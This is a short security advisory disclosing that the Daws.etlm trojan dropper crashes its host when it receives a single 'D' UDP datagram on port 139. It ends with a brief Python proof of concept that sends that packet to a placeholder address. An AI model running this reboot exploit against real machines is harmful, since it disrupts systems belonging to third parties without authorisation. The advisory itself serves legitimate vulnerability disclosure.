Threat: Trojan-Dropper.Win32.Daws.etlm
Vulnerability: Remote Unauthenticated System Reboot
Description: Daws.etlm drops an executable named "MSWDM.EXE" under Windows
dir and listens on UDP port 139. Unauthenticated third-party attackers can
send a single uppercase char "D" datagram packet to the infected machine
causing it to reboot. Basic testing using other upper/lower case chars from
A-Z or numbers 0-9 did not reveal anything else of interest.
Type: PE32
MD5: a0479e18283ed46e8908767dd0b40f8f
Vuln ID: MVID-2021-0111
Dropped files: MSWDM.EXE
Disclosure: 02/25/2021


Exploit/PoC:
from socket import *

MALWARE_HOST="x.x.x.x"
PORT=139

def doit():
    try:
        s=socket(AF_INET, SOCK_DGRAM)
        s.connect((MALWARE_HOST,PORT))
    except Exception as e:
        print(str(e))

    s.send("D")
    s.close()

    print("Trojan-Dropper.Win32.Daws.etlm / Remote Unauthenticated System
Reboot")
    print("MD5: a0479e18283ed46e8908767dd0b40f8f")
